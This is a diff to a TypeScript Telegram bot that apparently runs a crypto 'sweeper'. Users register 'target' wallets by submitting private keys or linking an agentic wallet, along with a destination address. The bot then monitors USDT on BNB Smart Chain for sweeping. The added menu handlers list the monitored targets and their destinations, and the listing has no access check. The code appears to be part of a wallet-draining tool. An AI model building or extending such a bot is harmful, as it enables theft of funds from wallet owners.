@@ -101,10 +101,50 @@ export const setupBot = (token: string) => {
         }
     });
 
+    // --- Dashboard Button Actions ---
+
     bot.action('ADD_TARGET', async (ctx) => {
         await ctx.answerCbQuery();
-        await ctx.reply("To add a wallet, send either:\n\n1. `/add <private_key> <destination>`\n2. `/link_agent <destination>`", { parse_mode: 'Markdown' });
+        await ctx.reply(
+            "📝 *Add Target Wallet*\n\n" +
+            "Choose your connection method:\n\n" +
+            "1️⃣ *Standard Private Key*:\n`/add <private_key> <destination>`\n\n" +
+            "2️⃣ *Binance Agentic Wallet*:\n`/link_agent <destination>`", 
+            { parse_mode: 'Markdown' }
+        );
     });
+
+    bot.action('SETTINGS', async (ctx) => {
+        await ctx.answerCbQuery();
+        await ctx.reply(
+            "⚙️ *Sweeper Settings*\n\n" +
+            "• Network: BNB Smart Chain Mainnet\n" +
+            "• Monitored Asset: USDT (BEP-20)\n" +
+            "• Gas Optimization: Auto-fee calculation active\n" +
+            "• Execution Mode: Dual-Mode (Raw Keys & Agentic)",
+            { parse_mode: 'Markdown' }
+        );
+    });
+
+    bot.action('MONITORS', async (ctx) => {
+        await ctx.answerCbQuery();
+        const keys = await redis.keys('target:*');
+        if (keys.length === 0) {
+            return ctx.reply("📊 *Active Monitors*\n\nNo wallets currently registered for sweeping.", { parse_mode: 'Markdown' });
+        }
+
+        let report = "📊 *Active Monitored Wallets*\n\n";
+        for (const key of keys) {
+            const data = await redis.hgetall(key);
+            const addr = key.split(':')[1];
+            const type = data.isAgentic === 'true' ? '🤖 Agentic' : '🔑 Raw Key';
+            report += `• \`${addr}\`\n  Type: ${type}\n  Dest: \`${data.destination}\`\n\n`;
+        }
+
+        await ctx.reply(report, { parse_mode: 'Markdown' });
+    });
+
+    // --- Admin Panel Button Actions ---
 
     bot.action('GEN_INVITE', adminGuard, async (ctx) => {
         await ctx.answerCbQuery();
@@ -120,6 +160,12 @@ export const setupBot = (token: string) => {
             `*(Expires in 24 hours, single-use)*`,
             { parse_mode: 'Markdown', ...adminPanelKeyboard }
         );
+    });
+
+    bot.action('LIST_USERS', adminGuard, async (ctx) => {
+        await ctx.answerCbQuery();
+        const users = await redis.smembers('whitelisted_users');
+        await ctx.reply(`👥 *Whitelisted Users Count:* ${users.length}\n\nUser IDs: \`${users.join(', ') || 'None'}\``, { parse_mode: 'Markdown' });
     });
 
     bot.action('MAIN_MENU', async (ctx) => {
